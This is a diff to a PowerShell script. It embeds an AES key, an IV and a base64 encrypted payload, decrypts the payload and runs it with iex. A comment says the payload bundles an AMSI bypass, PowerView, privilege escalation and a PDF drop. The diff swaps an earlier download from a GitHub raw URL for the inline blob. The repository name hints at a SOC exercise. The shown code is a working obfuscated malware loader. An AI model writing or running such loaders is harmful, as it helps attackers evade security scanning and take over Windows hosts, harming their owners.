@@ -13,15 +13,18 @@ function D {
     [Text.Encoding]::UTF8.GetString($m.ToArray())
 }
 
+# AES Key & IV
 $k = [Convert]::FromBase64String("Q3K1OxDixc03IRcJusRx7mbJX15GuNORMw2PuFevUfA=")
 $i = [Convert]::FromBase64String("kXHMQaoW9ayabOL5BKBI3w==")
 
+# Encrypted Payload (AMSI bypass, PowerView, priv esc, PDF drop)
+$p = @'
+FTx0G9FBoS6ruxqM5MCgTmRFKxyMicaeMitycYvEH/fuxKXl8mwg32o5OvogW5fWSl8SjHVI7PoWYZ2EkeP1PF8UOjSsU0B61trqYDkJikqRCRRXgTGpHtPtfBz/Ke+Geow7XGG3u/5wmxCT8q0OGEPymUCs+z9ufjxYaWJxKJdz71rXtzBTFHweepH0KxwWCR720DRHkejdTpzyf2qJ2P5LYGxEZ46S2yiq/b++WrZx0XBH+ce3kuR0B9G3HAV5NG30Y1+cBcz2wEoWWcosehaH9kVcv72sAqKIq+spINdUML0TOBghbqR3Dha5KeVPvZDrWuqGuLoVmYx4ecyLv+LPVXTvLkf1dJrOSBAvSFZ8w4bQ999IoilcN5BJEiLpNw2b7XGoLvpPSAZlIAsq8Oj5lp7I0+cbpchDeLPf+1QbazX+0c8OUkGIlu0FVh8Pfg8VKsUtDvMZdEcP8tCx63MuIpC1HairCrDRObCBo+528PXqteLnmD2lBS55dWRaTwF/lFp92+crS45fUPhPooSWAJiWUGDyYxtI2BGmHOnSCh3VKVCptr4J29JiGG5LBsKW4OQYPXaLGFFJpF320yNihXw6mcdF+Xaw77VNosrlt8KyXsdDNgT0PiOBV4vvOY6bJbawJJyoEQvmJnnfmdTGSPgOQsU9ikWtRNAVr+HC9l75FVrbU9rMdzwS77UCuN6YAUlp6X0K3jXhNwV0+6k3rh463bLN8hcuOO/eQwmlvBTdniE3gn2/oM6X0nbjKzPEVw/MML5Hz/dSVnz4O8VK2sLEtvIEGq4davcnLUY8P5eVSYDLc+6aAm319zPbqVEKVUaIPa9Pl2UMsYhTWzlxiEEvodi1sxmgsm6VekRX2EAw1mI003EjtaYr8jzLqy/X34V7XvWMtw4hySEymJj3O6WSipFYiEbOWji9cxB9pZpZ9k0aNRAxr7UVmNVAc1pg3TDGwLAOxKYujYZtNCu0cjJJDlvQvUt+WX3g
+'@
+
 try {
-    $url = "https://raw.githubusercontent.com/mashiachilov/TaskForSOC/main/payload.b64"
-    $raw = Invoke-WebRequest -Uri $url -UseBasicParsing
-    $p = ($raw.Content -replace '[^A-Za-z0-9+/=]', '').Trim()
     $s = D $p $k $i
     iex $s
 } catch {
-    Write-Error "[-] Failed to fetch or execute encrypted payload: $_"
+    Write-Error "[-] Decryption or execution failed: $_"
 }
